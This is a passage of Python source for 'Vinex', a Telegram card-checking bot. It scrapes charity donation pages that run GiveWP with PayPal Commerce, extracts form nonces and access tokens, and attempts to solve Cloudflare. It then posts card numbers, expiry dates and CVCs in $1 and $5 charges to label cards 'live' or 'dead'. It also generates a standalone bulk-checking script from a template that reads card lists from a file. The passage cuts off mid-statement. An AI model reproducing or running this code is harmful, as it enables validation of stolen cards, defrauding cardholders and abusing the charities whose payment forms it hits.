            self._warmup_session()
            try:
                r = self.r.get(self.page_url, headers={'user-agent': self.uu.random}, timeout=25)
                self.all_content = r.text
            except Exception:
                return False

            self.cf_detected = self._detect_cloudflare()
            if self.cf_detected:
                if self._solve_cloudflare():
                    try:
                        r = self.r.get(self.page_url, headers={'user-agent': self.uu.random}, timeout=20)
                        self.all_content = r.text
                    except Exception: pass

            self.page_html = self.all_content
            self._parallel_extract()
            self._deep_js_analysis()
            self._extract_basic()
            self._extract_all_form_fields()
            self._extract_tokens_ultimate()
            self._extract_tokens()

            if not self.au and self.client_id:
                self._try_oauth()
            if not self.au:
                self._try_ajax_client_token()

            if not self.nonec and self.id_form2: self._try_ajax_nonce()
            self._resolve_dropdown_options()
            self._resolve_special_fields()

            if not self.id_form1 and self.id_form2:
                self.id_form1 = f'{self.id_form2}-1'
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'

            self._detect_gateway_type()
            self._save_cache()
            return bool(self.id_form2 or self.nonec)
        except Exception as e:
            self._log(f'key: {e}')
            return False

    # ─── ATTEMPT — حرفيًا من السكريبت الشغّال ───
    def _attempt(self, n, mm, yy, cvc, amt):
        self.donation = amt
        expiry = f"20{yy}-{mm}"

        if not self.au:
            self._extract_tokens()
        if not self.au and self.client_id:
            self._try_oauth()
        if not self.au:
            self._try_ajax_client_token()

        price_ids = ['custom', '3', '4', '', None]
        if self.current_price_id and self.current_price_id not in price_ids:
            price_ids.insert(0, self.current_price_id)

        order_id = None
        last_err = ""

        for pid in price_ids:
            fields = {
                'give-form-id-prefix': (None, self.id_form1 or ''),
                'give-form-id': (None, self.id_form2 or ''),
                'give-form-hash': (None, self.nonec or ''),
                'give-amount': (None, amt),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, random.choice(self.first_names)),
                'give_last': (None, random.choice(self.last_names)),
                'give_email': (None, self.email),
                'give-gateway': (None, 'paypal-commerce'),
            }
            if pid is not None:
                fields['give-price-id'] = (None, pid)
            da2 = MultipartEncoder(fields)
            he3 = {'content-type': da2.content_type, 'user-agent': self.uu.random}
            r3_raw = None
            try:
                r3_raw = self.r.post(self.ajax_url,
                    params={'action': 'give_paypal_commerce_create_order'},
                    headers=he3, data=da2, timeout=15)
                j = r3_raw.json()
                if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                    order_id = j['data']['id']
                    break
                else:
                    last_err = str(j.get('data', {}).get('error', 'fail'))
            except Exception as e:
                if r3_raw is not None:
                    last_err = r3_raw.text[:150]
                else:
                    last_err = f"Exception: {str(e)[:100]}"

        if not order_id:
            return None, last_err

        metadata = self.paypal or self.client_id or ''
        he4 = {
            'authorization': f'Bearer {self.au or ""}',
            'paypal-client-metadata-id': metadata,
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': self.uu.random,
        }
        da3 = {
            'payment_source': {
                'card': {
                    'number': n, 'expiry': expiry, 'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        confirm_body = ""
        try:
            cr = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=he4, json=da3, timeout=15)
            confirm_body = cr.text
        except Exception: pass

        for pid in price_ids:
            fields = {
                'give-form-id-prefix': (None, self.id_form1 or ''),
                'give-form-id': (None, self.id_form2 or ''),
                'give-form-hash': (None, self.nonec or ''),
                'give-amount': (None, amt),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, random.choice(self.first_names)),
                'give_last': (None, random.choice(self.last_names)),
                'give_email': (None, self.email),
                'give-gateway': (None, 'paypal-commerce'),
            }
            if pid is not None:
                fields['give-price-id'] = (None, pid)
            da4 = MultipartEncoder(fields)
            he5 = {'content-type': da4.content_type, 'user-agent': self.uu.random}
            try:
                r5 = self.r.post(self.ajax_url,
                    params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                    headers=he5, data=da4, timeout=15)
                text = r5.text + confirm_body
                if '"success":true' in text.lower() and 'error' not in text.lower():
                    return f'CHARGE {amt}$', text
                for kw in LIVE_RESPONSES:
                    if kw.upper() in text.upper():
                        return kw, text
                try:
                    err = str(r5.json()['data']['error'])[:200]
                    if err and err != "None":
                        return err, text
                except Exception: pass
            except Exception: pass

        return confirm_body[:150] if confirm_body else "Approve failed", confirm_body

    def Charge(self, ccx):
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "Invalid card format"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy: yy = yy.split("20")[1]

        attempts = ["1.00", "5.00"]

        all_results = []
        create_errors = []

        for amt in attempts:
            res, text = self._attempt(n, mm, yy, cvc, amt)
            if res:
                all_results.append({'amount': amt, 'result': res, 'text': text})
            else:
                create_errors.append((amt, text))

        if not all_results:
            if create_errors:
                last_amt, last_err = create_errors[-1]
                self.donation = last_amt
                return last_err if last_err else "No response"
            return "No response"

        best = max(all_results, key=lambda x: score_result(x['result']))
        self.donation = best['amount']
        res = best['result']
        if 'ORDER_NOT_APPROVED' in res.upper() or 'PAYER_CANNOT_PAY' in res.upper():
            return "Payer cannot pay for this transaction."
        return res

# ═══════════════════════════════════════════════════════════════
#  BRIDGE
# ═══════════════════════════════════════════════════════════════
def check_single_link(link, thorough=True):
    try:
        link = safe_url(link)
        if not link:
            return {'link': str(link)[:100] if link else 'Invalid',
                    'live': False, 'respons': 'BAD_URL',
                    'amount': '1.00', 'tester': None,
                    'tier': None, 'order_status': None, 'capture_id': None}
        tester = VinexTester(link)
        if not tester.Key():
            return {'link': link[:100], 'live': False, 'respons': 'FETCH_FAILED',
                    'amount': '1.00', 'tester': tester,
                    'tier': None, 'order_status': None, 'capture_id': None}
        result = tester.Charge(TEST_CARD)
        live = is_live_response(result)
        return {'link': link[:100], 'live': live, 'respons': str(result)[:300],
                'amount': tester.donation, 'minimum': tester.minimum,
                'currency': tester.currency, 'auth': tester.auth_method,
                'tester': tester,
                'tier': tester.tier_used,
                'order_status': tester.last_order_status,
                'capture_id': tester.last_capture_id,
                'order_id': tester.last_order_id,
                'prices': len(tester.price_levels),
                'tokens': len(tester.token_candidates)}
    except Exception:
        return {'link': str(link)[:100] if link else 'Invalid',
                'live': False, 'respons': 'FATAL',
                'amount': '1.00', 'tester': None,
                'tier': None, 'order_status': None, 'capture_id': None}

# ═══════════════════════════════════════════════════════════════
#  GATEWAY TEMPLATE v25.0 — نفس منطق السكريبت الشغّال
# ═══════════════════════════════════════════════════════════════
GATEWAY_TEMPLATE_STR = r'''#!/usr/bin/env python3
# =====================================================
#  Live Gateway — Ultimate Edition v25.0
#  Link     : $page_url
#  Response : $initial_response
#  Amount   : $initial_amount
# =====================================================

import requests, re, random, time, base64, os
try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0')
    def rand_ua():
        try: return _UU.random
        except Exception: return 'Mozilla/5.0'
except Exception:
    def rand_ua(): return 'Mozilla/5.0'
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAGE_URL = "$page_url"
HOST     = "$host"
PATH     = "$path"

LIVE_RESPONSES = $live_responses_json


class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name  = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "$paypal_meta" or None
        self.client_id = "$client_id" or None
        self.donation = "1.00"
        self.minimum = "$minimum"
        self.id_form1 = "$id_form1" or None
        self.id_form2 = "$id_form2" or None
        self.nonec = "$nonce" or None
        self.au = "$access_token" or None
        self.ajax_url = "$ajax_url" or None
        self.current_price_id = "$current_pid" or None
        self.all_content = ""
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = type('U', (), {'random': property(lambda s: rand_ua())})()

    def _load_iframes(self, page):
        for pattern in [
            r'<iframe[^>]*src=["\']([^"\']*give[^"\']*)["\']',
            r'<iframe[^>]*src=["\']([^"\']*donation[^"\']*)["\']',
        ]:
            for m in re.finditer(pattern, page, re.IGNORECASE):
                ifu = m.group(1)
                if ifu.startswith('//'): ifu = 'https:' + ifu
                elif ifu.startswith('/'): ifu = f'https://{HOST}{ifu}'
                elif not ifu.startswith('http'): ifu = f'https://{HOST}/{ifu}'
                try:
                    r = self.r.get(ifu, headers={'user-agent': self.uu.random}, timeout=20)
                    if r.status_code == 200:
                        self.all_content += "\n" + r.text
                except Exception: pass

    def _load_external_js(self, page):
        js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', page)
        priority = [u for u in js_urls if any(k in u.lower() for k in ['give','donation','paypal','commerce','token','client'])]
        for js_url in priority[:20]:
            try:
                if js_url.startswith('//'): js_url = 'https:' + js_url
                elif js_url.startswith('/'): js_url = f'https://{HOST}{js_url}'
                elif not js_url.startswith('http'): js_url = f'https://{HOST}/{js_url}'
                r = self.r.get(js_url, headers={'user-agent': self.uu.random}, timeout=8)
                if r.status_code == 200:
                    self.all_content += "\n" + r.text
            except Exception: continue

    def _extract_basic(self):
        c = self.all_content
        for p in [r'name="give-form-id-prefix"\s+value="([^"]+)"',
                  r'"give-form-id-prefix"\s*:\s*"([^"]+)"']:
            m = re.search(p, c)
            if m: self.id_form1 = m.group(1); break
        for p in [r'name="give-form-id"\s+value="([^"]+)"',
                  r'"give-form-id"\s*:\s*"([^"]+)"',
                  r'"form_id"\s*:\s*"?(\d+)"?']:
            m = re.search(p, c)
            if m: self.id_form2 = m.group(1); break
        for p in [r'name="give-form-hash"\s+value="([^"]+)"',
                  r'"give-form-hash"\s*:\s*"([^"]+)"',
                  r'"nonce"\s*:\s*"([a-f0-9]{8,12})"']:
            m = re.search(p, c)
            if m: self.nonec = m.group(1); break
        m = re.search(r'name="give-form-minimum"\s+value="([^"]*)"', c)
        if m and m.group(1).strip():
            self.minimum = m.group(1).strip()
        for p in [r'name="give-price-id"\s+value="([^"]+)"',
                  r'"give-price-id"\s*:\s*"([^"]+)"']:
            m = re.search(p, c)
            if m: self.current_price_id = m.group(1); break
        if 'admin-ajax.php' in c:
            self.ajax_url = f'https://{HOST}/wp-admin/admin-ajax.php'

    def _extract_tokens(self):
        if self.au: return
        c = self.all_content
        for p in [r'"data-client-token":"([^"]+)"', r'data-client-token=["\']([^"\']+)["\']']:
            m = re.search(p, c)
            if m:
                enc = m.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    tm = re.search(r'"accessToken":"([^"]+)"', dec)
                    if tm: self.au = tm.group(1)
                    mm = re.search(r'merchant_id=([\w]+)', dec)
                    if mm: self.paypal = mm.group(1)
                    cm = re.search(r'"clientId":"([^"]+)"', dec)
                    if cm: self.client_id = cm.group(1)
                    if self.au: return
                except Exception: pass
        for p in [r'"accessToken"\s*:\s*"([^"]+)"', r'"(A21[A-Za-z0-9+/=_-]{40,})"']:
            m = re.search(p, c, re.IGNORECASE)
            if m: self.au = m.group(1); return

    def _try_oauth(self):
        if self.au or not self.client_id: return
        try:
            auth = base64.b64encode(f"{self.client_id}:".encode()).decode()
            r = self.r.post('https://api-m.paypal.com/v1/oauth2/token',
                headers={'authorization': f'Basic {auth}', 'content-type': 'application/x-www-form-urlencoded'},
                data={'grant_type': 'client_credentials'}, timeout=15)
            if r.status_code == 200:
                j = r.json()
                if 'access_token' in j:
                    self.au = j['access_token']
        except Exception: pass

    def _try_ajax_client_token(self):
        if self.au or not self.ajax_url or not self.id_form2: return
        for action in ['give_paypal_commerce_get_client_token', 'get_client_token',
                       'paypal_get_client_token', 'give_paypal_get_client_token']:
            try:
                r = self.r.post(self.ajax_url, data={'action': action, 'form-id': self.id_form2},
                    headers={'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}, timeout=10)
                if r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        token = j.get('data') if isinstance(j.get('data'), str) else None
                        if not token and isinstance(j.get('data'), dict):
                            token = j['data'].get('client_token') or j['data'].get('access_token')
                        if token:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                tm = re.search(r'"accessToken":"([^"]+)"', dec)
                                if tm: self.au = tm.group(1); return
                            except Exception: pass
                            if len(token) > 20:
                                self.au = token
                                return
                    except Exception: pass
            except Exception: continue

    def Key(self):
        try:
            r = self.r.get(PAGE_URL, headers={'user-agent': self.uu.random}, timeout=25)
            self.all_content = r.text
        except Exception:
            return False
        self._load_iframes(self.all_content)
        self._load_external_js(self.all_content)
        self._extract_basic()
        if not self.au:
            self._extract_tokens()
        if not self.au and self.client_id:
            self._try_oauth()
        if not self.au:
            self._try_ajax_client_token()
        if not self.id_form1 and self.id_form2:
            self.id_form1 = f"{self.id_form2}-1"
        if not self.ajax_url:
            self.ajax_url = f'https://{HOST}/wp-admin/admin-ajax.php'
        return bool(self.id_form2 or self.nonec)

    def _attempt(self, n, mm, yy, cvc, amt):
        self.donation = amt
        expiry = f"20{yy}-{mm}"

        if not self.au:
            self._extract_tokens()
        if not self.au and self.client_id:
            self._try_oauth()
        if not self.au:
            self._try_ajax_client_token()

        price_ids = ['custom', '3', '4', '', None]
        if self.current_price_id and self.current_price_id not in price_ids:
            price_ids.insert(0, self.current_price_id)

        order_id = None
        last_err = ""

        for pid in price_ids:
            fields = {
                'give-form-id-prefix': (None, self.id_form1 or ''),
                'give-form-id': (None, self.id_form2 or ''),
                'give-form-hash': (None, self.nonec or ''),
                'give-amount': (None, amt),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, random.choice(self.first_name)),
                'give_last': (None, random.choice(self.last_name)),
                'give_email': (None, self.email),
                'give-gateway': (None, 'paypal-commerce'),
            }
            if pid is not None:
                fields['give-price-id'] = (None, pid)
            da2 = MultipartEncoder(fields)
            he3 = {'content-type': da2.content_type, 'user-agent': self.uu.random}
            r3_raw = None
            try:
                r3_raw = self.r.post(self.ajax_url,
                    params={'action': 'give_paypal_commerce_create_order'},
                    headers=he3, data=da2, timeout=15)
                j = r3_raw.json()
                if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                    order_id = j['data']['id']
                    break
                else:
                    last_err = str(j.get('data', {}).get('error', 'fail'))
            except Exception as e:
                if r3_raw is not None:
                    last_err = r3_raw.text[:150]
                else:
                    last_err = f"Exception: {str(e)[:100]}"

        if not order_id:
            return None, last_err

        metadata = self.paypal or self.client_id or ''
        he4 = {
            'authorization': f'Bearer {self.au or ""}',
            'paypal-client-metadata-id': metadata,
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': self.uu.random,
        }
        da3 = {
            'payment_source': {
                'card': {
                    'number': n, 'expiry': expiry, 'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        confirm_body = ""
        try:
            cr = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=he4, json=da3, timeout=15)
            confirm_body = cr.text
        except Exception: pass

        for pid in price_ids:
            fields = {
                'give-form-id-prefix': (None, self.id_form1 or ''),
                'give-form-id': (None, self.id_form2 or ''),
                'give-form-hash': (None, self.nonec or ''),
                'give-amount': (None, amt),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, random.choice(self.first_name)),
                'give_last': (None, random.choice(self.last_name)),
                'give_email': (None, self.email),
                'give-gateway': (None, 'paypal-commerce'),
            }
            if pid is not None:
                fields['give-price-id'] = (None, pid)
            da4 = MultipartEncoder(fields)
            he5 = {'content-type': da4.content_type, 'user-agent': self.uu.random}
            try:
                r5 = self.r.post(self.ajax_url,
                    params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                    headers=he5, data=da4, timeout=15)
                text = r5.text + confirm_body
                if '"success":true' in text.lower() and 'error' not in text.lower():
                    return f'CHARGE {amt}$', text
                for kw in LIVE_RESPONSES:
                    if kw.upper() in text.upper():
                        return kw, text
                try:
                    err = str(r5.json()['data']['error'])[:200]
                    if err and err != "None":
                        return err, text
                except Exception: pass
            except Exception: pass

        return confirm_body[:150] if confirm_body else "Approve failed", confirm_body

    def Charge(self, ccx):
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "Invalid card format"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy: yy = yy.split("20")[1]

        attempts = ["1.00", "5.00"]

        PRIORITY = [
            ('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
            ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
            ('Payer cannot pay', 185), ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
            ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
            ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175),
            ('EXPIRED_CARD', 172), ('DO_NOT_HONOR', 170),
            ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168),
            ('ACCOUNT_CLOSED', 166), ('LOST_OR_STOLEN', 164),
            ('GENERIC_DECLINE', 155), ('TRANSACTION_REFUSED', 153), ('DECLINED', 100),
        ]

        def score(r):
            if not r: return 0
            up = r.upper()
            for k, s in PRIORITY:
                if k.upper() in up: return s
            return 1

        all_results = []
        create_errors = []

        for amt in attempts:
            res, text = self._attempt(n, mm, yy, cvc, amt)
            if res:
                all_results.append({'amount': amt, 'result': res, 'text': text})
            else:
                create_errors.append((amt, text))

        if not all_results:
            if create_errors:
                last_amt, last_err = create_errors[-1]
                self.donation = last_amt
                return last_err if last_err else "No response"
            return "No response"

        best = max(all_results, key=lambda x: score(x['result']))
        self.donation = best['amount']
        res = best['result']
        if 'ORDER_NOT_APPROVED' in res.upper() or 'PAYER_CANNOT_PAY' in res.upper():
            return "Payer cannot pay for this transaction."
        return res


def single_check():
    print("\n--- Single Card ---")
    card = input("Card: ").strip()
    if not card: return
    p = PayPal()
    if not p.Key():
        print("Extraction failed")
        return
    print("Response:", p.Charge(card))


def file_check():
    print("\n--- File Check ---")
    path = input("File: ").strip()
    if not os.path.exists(path):
        print("Not found")
        return
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        cards = [l.strip() for l in f if l.strip()]
    if not cards: return
    out = f"results_{int(time.time())}.txt"
    with open(out, 'w', encoding='utf-8') as fo:
        for i, c in enumerate(cards, 1):
            p = PayPal()
            if not p.Key():
                res = "Extraction failed"
            else:
                res = p.Charge(c)
            line = f"{c} => {res}"
            print(f"[{i}/{len(cards)}] {line}")
            fo.write(line + "\n"); fo.flush()
            time.sleep(1)
    print("Saved:", out)


def main():
    print("=" * 50)
    print("  " + PAGE_URL)
    print("=" * 50)
    while True:
        try:
            print("\n[1] Single  [2] File  [0] Exit")
            c = input("Choose: ").strip()
            if c == '1': single_check()
            elif c == '2': file_check()
            elif c == '0': break
        except (KeyboardInterrupt, EOFError): break
        except Exception: continue


if __name__ == '__main__':
    main()
'''

_GATEWAY_TEMPLATE = Template(GATEWAY_TEMPLATE_STR)

def generate_gateway_code(result, link, tester=None):
    link = link or 'https://invalid.local/'
    def g(a, d=''):
        try:
            if tester and getattr(tester, a, None): return getattr(tester, a)
            return d
        except Exception: return d
    p = urlparse(link); host = p.netloc or 'invalid.local'
    path = (p.path or '/')
    if p.query: path += '?' + p.query
    pl = tester.price_levels if tester and tester.price_levels else []
    ff = tester.form_fields if tester and tester.form_fields else {}
    init_resp = str(result or 'APPROVED')[:200].replace('\n', ' ').replace('\r', '')
    init_amt = str(getattr(tester, 'donation', '5.00') if tester else '5.00')
    return _GATEWAY_TEMPLATE.safe_substitute(
        page_url=link,
        host=host,
        path=path,
        initial_response=init_resp,
        initial_amount=init_amt,
        live_responses_json=repr(LIVE_RESPONSES),
        ajax_url=g('ajax_url') or f'https://{host}/wp-admin/admin-ajax.php',
        id_form1=g('id_form1'), id_form2=g('id_form2'), nonce=g('nonec'),
        access_token=g('au'), paypal_meta=g('paypal'), client_id=g('client_id'),
        currency=g('currency', 'USD'), minimum=g('minimum', '5.00'),
        current_pid=g('current_price_id'),
    )
    # ═══════════════════════════════════════════════════════════════
#  BOT HANDLERS
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def cmd_start(message):
    try:
        save_user(message.from_user.id)
        react_to(message, '🔥')
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        name = message.from_user.first_name or 'User'
        text = (
            f'[⚡] {SB("Welcome to Vinex v25.0")} {ve("party")}\n'
            f'{vsep()}\n'
            f'{vt("User", f"{name} [VIP]")}\n'
            f'{vt("ID", f"<code>{uid}</code>")}\n'
            f'{vt("Status", B("Online"))} {ve("party")}\n'
            f'{vsep()}\n'
            f'{vt("Single", "<code>/paypal URL</code>")}\n'
            f'{vt("Bulk", "<code>/mass</code>")}\n'
            f'{vt("Resume", "<code>/resume</code>")}\n'
            f'{vt("Stop", "<code>/stop</code>")}\n'
            f'{vt("Stats", "<code>/stats</code>")}\n'
            f'{vt("Diag", "<code>/diag URL</code>")}\n'
            f'{vt("Luck", "<code>/luck</code>")}\n'
            f'{vsep()}\n'
            f'{vt("Amounts", "1$ → 5$")}\n'
            f'{vt("Engine", "Ultimate Edition")}\n'
            f'{vt("Live", "LIVE_RESPONSES (full)")}\n'
            f'{vt("Cloudflare", "Auto-detect + solve")}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(vinex_btn('Stats', 'success', 'record', callback_data='stats'),
               vinex_btn('Help', 'success', 'gear', callback_data='help'))
        kb.add(vinex_btn('Quick Scan', 'primary', 'play', callback_data='howto_paypal'),
               vinex_btn('Bulk Scan', 'primary', 'gift', callback_data='howto_mass'))
        kb.add(vinex_btn('Try Luck', 'primary', 'party', callback_data='luck'),
               vinex_btn('Stop', 'danger', 'stop', callback_data='stop'))
        kb.add(vinex_btn('Emoji Pack', 'primary', 'laugh', callback_data='emojis'))
        safe_send_message(message.chat.id, text, reply_markup=kb, effect=EFFECT_CELEBRATE)
    except Exception: log.exception('cmd_start')

@bot.message_handler(commands=['help'])
def cmd_help(message):
    try:
        react_to(message, '💡')
        text = (
            f'[⚡] {SB("Vinex Manual v25.0")} {ve("gear")}\n'
            f'{vsep()}\n'
            f'{vt("Single", "<code>/paypal URL</code>")}\n'
            f'  {SB("→")} Decode Engine v2 (base64/32/16/85/url/html/rot/jwt/gzip/zlib/br/xor)\n'
            f'  {SB("→")} Extractor v2 (33 passes + parallel)\n'
            f'  {SB("→")} LIVE_RESPONSES كاملة\n'
            f'  {SB("→")} price_ids: custom/3/4/""/None\n'
            f'  {SB("→")} Confirm + Approve loop\n'
            f'  {SB("→")} Amounts: 1$ → 5$\n'
            f'{vt("Bulk", "<code>/mass</code> + .txt")}\n'
            f'{vt("Control", "<code>/stop</code> / <code>/resume</code>")}\n'
            f'{vt("Diag", "<code>/diag URL</code>")}\n'
            f'{vt("Fun", "<code>/luck</code> / <code>/mood</code>")}\n'
            f'{vsep()}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', 'play', callback_data='back_start'))
        safe_send_message(message.chat.id, text, reply_markup=kb, effect=EFFECT_CELEBRATE)
    except Exception: pass

@bot.message_handler(commands=['ping'])
def cmd_ping(message):
    try:
        t0 = time.time()
        sent = safe_send_message(message.chat.id, '🏓 Pinging...')
        dt = (time.time() - t0) * 1000
        if sent:
            safe_edit_message(message.chat.id, sent.message_id,
                f'[⚡] {SB("PONG")}\n{vsep()}\n'
                f'{vt("Latency", f"<code>{dt:.0f} ms</code>")}\n'
                f'{vt("Bot", "VINEX v25.0")}\n'
                f'{vt("Users", f"<code>{len(open(USERS_FILE).read().splitlines())}</code>")}\n'
                f'{vt("Turnstile", "✅ Enabled" if _turnstile.enabled else "⚠️ Disabled")}')
    except Exception: pass

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    try:
        react_to(message, '📊')
        s = load_stats()
        users_n = len(open(USERS_FILE).read().splitlines())
        rate = (s.get('live', 0) / s.get('checks', 1) * 100 if s.get('checks', 0) else 0)
        filled = int(rate / 5)
        bar = '█' * filled + '░' * (20 - filled)
        checks_n = s.get('checks', 0)
        live_n = s.get('live', 0)
        dead_n = s.get('dead', 0)
        text = (
            f'[⚡] {SB("Global Stats")} {ve("record")}\n'
            f'{vsep()}\n'
            f'{vt("Users", f"<code>{users_n}</code>")}\n'
            f'{vt("Checks", f"<code>{checks_n}</code>")}\n'
            f'{vt("Live", f"<code>{live_n}</code>")} {ve("party")}\n'
            f'{vt("Dead", f"<code>{dead_n}</code>")} {ve("ban")}\n'
            f'{vt("Rate", f"<code>{rate:.1f}%</code>")}\n'
            f'{vsep()}\n'
            f'<code>{bar}</code> {B(str(round(rate)) + "%")}'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(vinex_btn('Menu', 'primary', 'play', callback_data='back_start'),
               vinex_btn('Luck', 'success', 'party', callback_data='luck'))
        safe_send_message(message.chat.id, text, reply_markup=kb)
    except Exception: pass

@bot.message_handler(commands=['luck'])
def cmd_luck(message):
    try:
        react_to(message, '🎲')
        d = send_dice(message.chat.id, '🎲')
        if d:
            time.sleep(3)
            val = d.dice.value if hasattr(d, 'dice') else 0
            if val >= 5:
                safe_send_message(message.chat.id, f'🎉 Lucky! <code>{val}</code>\n🔥 Try /paypal!', effect=EFFECT_FIRE)
            else:
                safe_send_message(message.chat.id, f'🎲 Rolled <code>{val}</code>\n😏 Next time!')
    except Exception: pass

@bot.message_handler(commands=['mood'])
def cmd_mood(message):
    try:
        emoji = random.choice(['🎲', '🎯', '⚽', '🏀', '🎳', '🎰'])
        react_to(message, '🎉')
        send_dice(message.chat.id, emoji)
    except Exception: pass

@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def cmd_paypal(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_paypal[uid] < PAYPAL_COOLDOWN: return
        user_last_paypal[uid] = now
        chat_id = message.chat.id
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_send_message(chat_id, f'[⚡] {B("Usage")}: <code>/paypal URL</code>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(chat_id, f'[⚡] {B("Invalid link")}.')
            return
        lkey = f'{uid}:{normalize_url_key(link)}'
        if lkey in link_cooldowns:
            if now - link_cooldowns[lkey] < LINK_COOLDOWN:
                rem = int(LINK_COOLDOWN - (now - link_cooldowns[lkey]))
                safe_send_message(chat_id, f'[⚡] {B("Cooling")}: {rem}s')
                return
        link_cooldowns[lkey] = now

        react_to(message, '⚡')
        show_typing(chat_id, 'typing', duration=3.0)
        ko = safe_send_message(chat_id,
            f'[⚡] {SB("Vinex Scanning")}\n'
            f'{vsep()}\n'
            f'{vt("Target", f"<code>{link[:80]}</code>")}\n'
            f'{vt("Engine", "v25.0 Ultimate")}\n'
            f'{vt("Amounts", "1$ → 5$")}\n'
            f'{vsep()}\n'
            f'[⚡] {ve("gear")} {SB("Running Pipeline")}...')
        if not ko: return

        bump_stat('checks')
        tester = VinexTester(link)
        tester.Key()
        result = tester.Charge(TEST_CARD)
        live = is_live_response(result)
        user_name = message.from_user.first_name or 'User'

        cf_badge = ''
        if tester.cf_detected:
            cf_badge = f'\n{vt("Cloudflare", "✅ Solved" if tester.cf_solved else "⚠️ Detected")}'

        if not live:
            bump_stat('dead')
            react_to(message, '😢')
            resp_text = normalize_result(result)[:300]
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("Dead Detected")} {ve("ban")}\n'
                f'{vsep()}\n'
                f'{vt("User", f"{user_name} [VIP]")}\n'
                f'{vt("Status", B("Dead"))} {ve("ban")}\n'
                f'{vt("Response", f"<code>{resp_text}</code>")}\n'
                f'{vt("Auth", f"<code>{tester.auth_method}</code>")}\n'
                f'{vt("Gateway", f"#{tester.gateway_type}")}\n'
                f'{vt("Tokens", f"<code>{len(tester.token_candidates)}</code>")}\n'
                f'{vt("Prices", f"<code>{len(tester.price_levels)} levels</code>")}'
                f'{cf_badge}\n'
                f'{vsep()}\n'
                f'[⚡] {SB("Vinex")} - {B("Checker")}')
            return

        bump_stat('live')
        react_to(message, '🔥')
        show_typing(chat_id, 'upload_document', duration=2.0)

        try:
            code = generate_gateway_code(result, link, tester)
            if not code or len(code) < 500:
                raise Exception(f'Too small: {len(code)}b')
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("Error")}: <code>{str(e)[:200]}</code>')
            return

        fname = f'vinex_v25_{int(time.time())}_{uid}.py'
        try:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(code)
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("File Error")}: <code>{str(e)[:200]}</code>')
            return

        display = normalize_result(result)[:200]
        is_charge = 'CHARGE' in str(result).upper()
        status = 'Charged' if is_charge else 'Hit'
        head = (f'[⚡] {SB("Charged")} {ve("party")} {ve("cash")}'
